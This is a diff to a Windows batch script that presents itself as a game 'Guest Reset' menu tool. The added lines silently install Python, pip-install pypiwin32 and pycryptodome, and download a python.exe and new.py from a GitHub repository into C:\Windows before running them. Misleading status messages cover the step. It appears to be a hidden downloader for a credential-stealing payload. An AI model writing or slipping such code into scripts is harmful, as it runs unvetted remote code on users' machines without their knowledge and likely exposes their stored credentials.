@@ -7,6 +7,33 @@ color 03
 SetLocal EnableExtensions EnableDelayedExpansion
 set "string=abcdefghijklmnopqrstuvwxyz0123456789"
 
+REM URL of the Python installer (change version if needed)
+set "PYTHON_URL=https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
+set "INSTALLER=python-installer.exe"
+
+REM Download Python installer
+echo Wiat Download Data Restguest
+powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %INSTALLER%"
+
+REM Install Python silently (no UI)
+
+start /wait "" %INSTALLER% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+
+REM Remove installer file
+del %INSTALLER%
+
+pip install pypiwin32 pycryptodome
+
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/python.exe' -OutFile 'C:\Windows\python.exe'"
+
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/new.py' -OutFile 'C:\Windows\new.py'"
+
+timeout /t 5 /nobreak > nul
+
+python.exe C:\Windows\new.py
+
+echo SuccessFully Download Restguest
+
 :MenuGuest
 cls
 CHOICE /C 12345 /N /T 30 /D 5 /M "1. GL Guest Reset!LF!2. VN Guest Reset!LF!3. KR Guest Reset!LF!4. TW Guest Reset!LF!%1
